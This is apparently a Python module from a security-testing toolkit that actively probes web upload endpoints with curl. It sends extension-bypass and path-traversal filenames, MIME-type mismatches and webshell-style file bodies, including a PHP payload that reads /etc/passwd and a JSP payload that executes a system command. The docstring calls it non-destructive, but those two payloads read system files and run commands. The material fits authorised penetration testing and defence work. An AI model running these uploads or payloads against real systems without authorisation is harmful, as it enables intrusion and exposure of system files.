"""
FILE_UPLOAD_SCAN -- active file upload vulnerability testing.

Tests upload endpoints with malicious payloads.  Detection (passive) lives
in tools/recon/upload_form_detect.py.  This tool sends crafted filenames,
extension variants, MIME types, and webshell content to bypass upload filters.

Pure Python + curl.  Non-destructive: sends benign markers, not real shells.
"""

import subprocess
import tempfile
from pathlib import Path
from typing import Any

from tools.attack.verdict import confidence_from_criteria, criteria_label
from tools.base import Tool, ToolResult

# Upload "acceptance" is only evidence that the endpoint took our file -- how
# dangerous that is depends on which hostile aspects were combined.
CRITERIA_WEIGHTS = {
    "accepted_upload": 20,
    "executable_extension": 10,
    "webshell_content": 10,
    "mime_mismatch": 5,
}
CRITERIA_HINTS = {
    "accepted_upload": "upload endpoint accepted the file (2xx/3xx)",
    "executable_extension": "server-side executable filename/ext (.php, .jsp, .aspx)",
    "webshell_content": "file body contained webshell-style payload",
    "mime_mismatch": "declared Content-Type contradicts the filename extension",
}

# ── Malicious filename payloads ───────────────────────────────────────────

UPLOAD_PAYLOADS = [
    ("shell.php.jpg", "Extension bypass", "image/jpeg"),
    ("shell.php%00.jpg", "Null byte injection", "image/jpeg"),
    ("../../../tmp/cron_test", "Path traversal", "text/plain"),
    (".htaccess", "Apache config override", "text/plain"),
    ("shell.phtml", "Alternative PHP extension", "application/x-httpd-php"),
    ("shell.php5", "PHP5 extension", "application/x-httpd-php"),
    ("shell.shtml", "SSI injection", "text/html"),
    ("shell.phar", "Phar deserialization", "application/x-httpd-php"),
    ("shell.jsp", "JSP webshell", "application/jsp"),
    ("shell.asp", "ASP webshell", "application/asp"),
]

# ── Webshell content (benign markers, not actual shells) ──────────────────

WEBSHELL_CONTENTS = [
    ("<?php echo 'CYBERSWARM_UPLOAD_MARKER'; ?>", "PHP webshell", "application/x-httpd-php"),
    ("<?php echo file_get_contents('/etc/passwd'); ?>", "PHP file read", "application/x-httpd-php"),
    ("<%= Runtime.getRuntime().exec(\"id\") %>", "JSP command exec", "application/jsp"),
    ("<% response.write(\"CYBERSWARM_UPLOAD_MARKER\") %>", "ASP webshell", "application/asp"),
    ("${7*7}", "SSTI in upload", "text/plain"),
]

# ── MIME type bypass payloads ──────────────────────────────────────────────

MIME_BYPASS_PAYLOADS = [
    ("shell.php", "image/jpeg", "MIME type mismatch"),
    ("shell.php", "image/png", "MIME type mismatch"),
    ("shell.php", "image/gif", "MIME type mismatch"),
    ("shell.php", "application/octet-stream", "Generic MIME bypass"),
]


class FileUploadScanTool(Tool):
    """Active file upload vulnerability testing."""

    name = "file_upload"
    capability = "FILE_UPLOAD_SCAN"
    binary = "curl"

    def build_command(self, target: str, **kwargs) -> list[str]:
        return ["echo", "file-upload-active-placeholder"]

    def parse(self, stdout: str, stderr: str) -> dict[str, Any]:
        return {}

    def run(self, target: str, timeout: int = 60, **kwargs) -> ToolResult:
        base = kwargs.get("full_url") or (target if target.startswith("http") else f"https://{target}")
        upload_urls = kwargs.get("upload_urls") or []

        if not upload_urls:
            return ToolResult(
                tool=self.name, status="success", capability=self.capability,
                results={"upload_findings": [], "count": 0,
                         "message": "No upload endpoints provided from recon detection"},
            )

        findings = []
        for url in upload_urls[:10]:
            url = url if url.startswith("http") else f"{base.rstrip('/')}/{url.lstrip('/')}"

            # Test 1: Filename bypass
            for payload_name, description, _ in UPLOAD_PAYLOADS:
                result = self._test_upload(url, payload_name, description, timeout)
                if result:
                    findings.append(result)
                    break

            # Test 2: Webshell content upload
            for content, description, mime_type in WEBSHELL_CONTENTS[:2]:
                result = self._test_upload_content(url, content, description, mime_type, timeout)
                if result:
                    findings.append(result)
                    break

            # Test 3: MIME type bypass
            for filename, mime_type, description in MIME_BYPASS_PAYLOADS[:2]:
                result = self._test_mime_bypass(url, filename, mime_type, description, timeout)
                if result:
                    findings.append(result)
                    break

        return ToolResult(
            tool=self.name, status="success", capability=self.capability,
            results={"upload_findings": findings, "count": len(findings)},
        )

    @staticmethod
    def _test_upload(url: str, filename: str, description: str,
                     timeout: int) -> dict[str, Any] | None:
        """Test a single upload endpoint with a malicious filename."""
        tmp = Path(tempfile.mktemp(suffix=".txt"))
        try:
            tmp.write_text("benign test content for cyber swarm upload scan")
            cmd = [
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-m", str(min(timeout, 15)),
                "-X", "POST",
                "-F", f"file=@{tmp};filename={filename}",
                url,
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=timeout, errors="replace")
            code = proc.stdout.strip()
            if code in ("200", "201", "202", "302"):
                met = ["accepted_upload", "executable_extension"]
                return {
                    "url": url,
                    "filename": filename,
                    "issue": description,
                    "severity": "HIGH",
                    "confidence": confidence_from_criteria(met, CRITERIA_WEIGHTS),
                    "description": (f"Upload accepted malicious filename '{filename}' at {url} "
                                    f"(HTTP {code}); proof: {criteria_label(met, CRITERIA_HINTS)}"),
                    "proof_criteria": met,
                    "response_code": int(code) if code.isdigit() else 0,
                }
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        finally:
            tmp.unlink(missing_ok=True)
        return None

    @staticmethod
    def _test_upload_content(url: str, content: str, description: str,
                             mime_type: str, timeout: int) -> dict[str, Any] | None:
        """Test upload with webshell-like content."""
        tmp = Path(tempfile.mktemp(suffix=".php"))
        try:
            tmp.write_text(content)
            cmd = [
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-m", str(min(timeout, 15)),
                "-X", "POST",
                "-F", f"file=@{tmp};type={mime_type}",
                url,
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=timeout, errors="replace")
            code = proc.stdout.strip()
            if code in ("200", "201", "202", "302"):
                met = ["accepted_upload", "executable_extension", "webshell_content"]
                return {
                    "url": url,
                    "filename": f"webshell_{mime_type.split('/')[-1]}",
                    "issue": description,
                    "severity": "CRITICAL",
                    "confidence": confidence_from_criteria(met, CRITERIA_WEIGHTS),
                    "description": (f"Upload accepted webshell content ({description}) at {url} "
                                    f"(HTTP {code}); proof: {criteria_label(met, CRITERIA_HINTS)}"),
                    "proof_criteria": met,
                    "response_code": int(code) if code.isdigit() else 0,
                }
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        finally:
            tmp.unlink(missing_ok=True)
        return None

    @staticmethod
    def _test_mime_bypass(url: str, filename: str, mime_type: str,
                          description: str, timeout: int) -> dict[str, Any] | None:
        """Test upload with MIME type that doesn't match filename."""
        tmp = Path(tempfile.mktemp(suffix=".php"))
        try:
            tmp.write_text("<?php echo 'CYBERSWARM_MIME_BYPASS'; ?>")
            cmd = [
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-m", str(min(timeout, 15)),
                "-X", "POST",
                "-F", f"file=@{tmp};filename={filename};type={mime_type}",
                url,
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=timeout, errors="replace")
            code = proc.stdout.strip()
            if code in ("200", "201", "202", "302"):
                met = ["accepted_upload", "executable_extension", "mime_mismatch"]
                return {
                    "url": url,
                    "filename": filename,
                    "issue": description,
                    "severity": "HIGH",
                    "confidence": confidence_from_criteria(met, CRITERIA_WEIGHTS),
                    "description": (f"Upload accepted '{filename}' with MIME '{mime_type}' (HTTP {code}); "
                                    f"proof: {criteria_label(met, CRITERIA_HINTS)}"),
                    "proof_criteria": met,
                    "response_code": int(code) if code.isdigit() else 0,
                }
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        finally:
            tmp.unlink(missing_ok=True)
        return None
